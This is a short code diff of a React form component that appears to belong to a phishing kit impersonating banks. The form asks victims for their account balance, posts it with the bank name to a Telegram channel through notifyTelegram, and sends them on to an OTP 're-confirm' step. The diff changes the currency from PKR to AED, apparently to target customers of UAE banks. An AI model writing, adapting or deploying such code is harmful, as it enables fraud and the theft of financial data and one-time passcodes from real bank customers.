@@ -31,7 +31,7 @@ export function BalanceForm({ slug, bankName }: { slug: string; bankName: string
     if (!isValid) return
     notifyTelegram('Account Balance Submitted', [
       { label: 'Bank', value: bankName },
-      { label: 'Balance (PKR)', value: display },
+      { label: 'Balance (AED)', value: display },
     ])
     // Continue to the final verification (re-confirm OTP) step.
     router.push(`/bank/${slug}/verify`)
@@ -41,7 +41,7 @@ export function BalanceForm({ slug, bankName }: { slug: string; bankName: string
     <form onSubmit={handleSubmit} className="mt-6">
       <h2 className="text-2xl font-extrabold tracking-tight">Account Balance</h2>
       <p className="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
-        Enter your current {bankName} account balance in PKR.
+        Enter your current {bankName} account balance in AED.
       </p>
 
       {/* Balance input card */}
@@ -53,7 +53,7 @@ export function BalanceForm({ slug, bankName }: { slug: string; bankName: string
           Current Balance
         </label>
         <div className="bank-themed-input mt-3 flex items-center gap-3 rounded-2xl border px-4 py-3">
-          <span className="shrink-0 text-sm font-bold text-foreground">PKR</span>
+          <span className="shrink-0 text-sm font-bold text-foreground">AED</span>
           <span className="h-6 w-px shrink-0 bg-border" aria-hidden="true" />
           <input
             id="balance"
